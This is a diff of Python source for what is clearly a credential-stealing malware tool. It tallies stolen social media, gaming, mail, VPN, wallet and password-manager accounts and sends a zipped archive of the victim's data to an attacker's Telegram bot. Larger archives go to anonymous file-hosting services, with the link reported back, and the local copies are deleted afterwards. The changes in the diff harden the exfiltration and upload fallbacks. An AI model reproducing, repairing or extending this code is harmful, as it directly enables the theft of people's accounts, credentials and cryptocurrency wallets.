-<b>Twitter:</b>\t<code>{str(len(ListFonction.TwitterAccounts))}</code>
-<b>TikTok:</b>\t<code>{str(len(ListFonction.TikTokAccounts))}</code>
-<b>RiotUser:</b>\t<code>{str(len(ListFonction.RiotUserAccounts))}</code>
-<b>Roblox:</b>\t<code>{str(len(ListFonction.RobloxAccounts))}</code>
+<b>Reddit:</b> <code>{str(len(ListFonction.RedditAccounts))}</code>
+<b>Instagram:</b> <code>{str(len(ListFonction.InstagramAccounts))}</code>
+<b>Guilded:</b> <code>{str(len(ListFonction.GuildedAccounts))}</code>
+<b>Patreon:</b> <code>{str(len(ListFonction.PatreonAccounts))}</code>
+<b>Spotify:</b> <code>{str(len(ListFonction.SpotifyAccount))}</code>
+<b>Twitch:</b> <code>{str(len(ListFonction.TwitchAccounts))}</code>
+<b>Twitter:</b> <code>{str(len(ListFonction.TwitterAccounts))}</code>
+<b>TikTok:</b> <code>{str(len(ListFonction.TikTokAccounts))}</code>
+<b>RiotUser:</b> <code>{str(len(ListFonction.RiotUserAccounts))}</code>
+<b>Roblox:</b> <code>{str(len(ListFonction.RobloxAccounts))}</code>
 
 <b><i><u>Other</u></i></b>
-<b>Messenger:</b>\t<code>{str(len(ListFonction.Messengers))}</code>
-<b>VPN:</b>\t<code>{str(len(ListFonction.VpnsCounts))}</code>
-<b>FTP Client:</b>\t<code>{str(len(ListFonction.FtpClient))}</code>
-<b>Games:</b>\t<code>{str(len(ListFonction.GamesCounts))}</code>
-<b>Mail:</b>\t<code>{str(len(ListFonction.MailsCounts))}</code>
-<b>Wallets:</b>\t<code>{str(len(ListFonction.WalletsCounts))}</code>
-<b>Password Manager:</b>\t<code>{str(len(ListFonction.PasswordManager))}</code>
+<b>Messenger:</b> <code>{str(len(ListFonction.Messengers))}</code>
+<b>VPN:</b> <code>{str(len(ListFonction.VpnsCounts))}</code>
+<b>FTP Client:</b> <code>{str(len(ListFonction.FtpClient))}</code>
+<b>Games:</b> <code>{str(len(ListFonction.GamesCounts))}</code>
+<b>Mail:</b> <code>{str(len(ListFonction.MailsCounts))}</code>
+<b>Wallets:</b> <code>{str(len(ListFonction.WalletsCounts))}</code>
+<b>Password Manager:</b> <code>{str(len(ListFonction.PasswordManager))}</code>
 """
 
             send = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
@@ -2358,54 +2306,47 @@ class get_data:
 
             async with aiohttp.ClientSession() as session:
                 async with session.post(send, data=message_payload) as response:
-                    pass
+                    if response.status != 200:
+                        raise Exception(f"Failed to send message: {await response.text()}")
 
-            await self.SendKeyWords()
-            
-            if not os.path.getsize(filePath + ".zip") / (1024 * 1024) > 15:
-                send_document_url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
-                document_payload = {
-                    'chat_id': CHAT_ID,
-                }
-
-                requests.post(send_document_url, data=document_payload, files={'document': open(filePath + ".zip", 'rb')})
-            
-            else:
-                file_url = await UploadFiles.upload_file(filePath + ".zip")
-
-                if file_url is not None:
-                    text = f"<b>{platform.node()} - File Link</b>\n\n<b>{file_url}</b>"
-
-                    message_payload = {
-                        'chat_id': CHAT_ID,
-                        'text': text,
-                        'parse_mode': 'HTML'
-                    }
-
+                if os.path.getsize(filePath + ".zip") / (1024 * 1024) <= 15:
+                    send_document_url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
                     async with aiohttp.ClientSession() as session:
-                        async with session.post(send, data=message_payload) as response:
-                            pass
+                        with open(filePath + ".zip", 'rb') as file:
+                            document_payload = {
+                                'chat_id': CHAT_ID,
+                            }
+                            files = {
+                                'document': file
+                            }
+                            async with session.post(send_document_url, data=document_payload, files=files) as response:
+                                if response.status != 200:
+                                    error_handler(f"Error sending file: {await response.text()}")
                 else:
-                    text = "<b>Can't Send File With GoFile</b>"
+                    file_url = await UploadFiles.upload_file(filePath + ".zip")
+                    if file_url is not None:
+                        text = f"<b>{platform.node()} - File Link</b>\n\n<b>{file_url}</b>"
+                        message_payload['text'] = text
+                        async with aiohttp.ClientSession() as session:
+                            async with session.post(send, data=message_payload) as response:
+                                if response.status != 200:
+                                    raise Exception(f"Failed to send file link: {await response.text()}")
+                    else:
+                        text = "<b>Can't Send File With GoFile</b>"
+                        message_payload['text'] = text
+                        async with aiohttp.ClientSession() as session:
+                            async with session.post(send, data=message_payload) as response:
+                                if response.status != 200:
+                                    raise Exception(f"Failed to send error message: {await response.text()}")
 
-                    message_payload = {
-                        'chat_id': CHAT_ID,
-                        'text': text,
-                        'parse_mode': 'HTML'
-                    }
-
-                    async with aiohttp.ClientSession() as session:
-                        async with session.post(send, data=message_payload) as response:
-                            pass
-            try:
-                os.remove(filePath + ".zip")
-                shutil.rmtree(filePath)
-
-            except Exception as e:
-                error_handler(f"remove all files zip error - {str(e)}")
+                try:
+                    os.remove(filePath + ".zip")
+                    shutil.rmtree(filePath)
+                except Exception as e:
+                    error_handler(f"Failed to remove files: {str(e)}")
 
         except Exception as e:
-            error_handler(f"send all data error - {str(e)}")
+            error_handler(f"SendAllData error: {str(e)}")
         
 
 class UploadFiles:
@@ -2424,14 +2365,16 @@ class UploadFiles:
     async def upload_gofile(path: str) -> str:
         try:
             server = await UploadFiles.getserver()
-
             async with aiohttp.ClientSession() as session:
                 with open(path, 'rb') as file:
                     form = aiohttp.FormData()
                     form.add_field('file', file, filename=os.path.basename(path))
                     async with session.post(f'https://{server}.gofile.io/uploadFile', data=form) as response:
                         data = await response.json()
-                        return data["data"]["downloadPage"]
+                        if response.status == 200 and "data" in data:
+                            return data["data"]["downloadPage"]
+                        else:
+                            return None
         except Exception as e:
             error_handler(f"gofile error - {str(e)}")
             return None
@@ -2447,7 +2390,10 @@ class UploadFiles:
                     form.add_field('userhash', '')
                     async with session.post('https://catbox.moe/user/api.php', data=form) as response:
                         result = await response.text()
-                        return result
+                        if "catbox.moe" in result:
+                            return result
+                        else:
+                            return None
         except Exception as e:
             error_handler(f"catbox error - {str(e)}")
             return None
@@ -2478,7 +2424,10 @@ class UploadFiles:
                     form.add_field('file', file, filename=os.path.basename(path))
                     async with session.post('https://uguu.se/api.php?d=upload', data=form) as response:
                         data = await response.json()
-                        return data.get("url")
+                        if "url" in data:
+                            return data.get("url")
+                        else:
+                            return None
         except Exception as e:
             error_handler(f"uguu error - {str(e)}")
             return None
@@ -2492,7 +2441,10 @@ class UploadFiles:
                     form.add_field('file', file, filename=os.path.basename(path))
                     async with session.post('https://krakenfiles.com/api/v1/file/upload', data=form) as response:
                         data = await response.json()
-                        return data["data"]["file"]["url"]
+                        if "data" in data and "file" in data["data"]:
+                            return data["data"]["file"]["url"]
+                        else:
+                            return None
         except Exception as e:
             error_handler(f"krakenfiles error - {str(e)}")
             return None
@@ -2501,8 +2453,8 @@ class UploadFiles:
     async def upload_file(file_path: str) -> str:
         upload_attempts = [
             ('GoFile', UploadFiles.upload_gofile),
-            ('File.io', UploadFiles.upload_fileio),
             ('Catbox', UploadFiles.upload_catbox),
+            ('File.io', UploadFiles.upload_fileio),
             ('Uguu', UploadFiles.upload_uguu),
             ('KrakenFiles', UploadFiles.upload_krakenfiles),
         ]
@@ -2513,7 +2465,7 @@ class UploadFiles:
                 if result:
                     return result
             except Exception as e:
-                error_handler(f"upload file attempts error - {str(e)}")
+                error_handler(f"{platform} upload attempt error - {str(e)}")
                 continue
         
         return "All upload attempts failed."
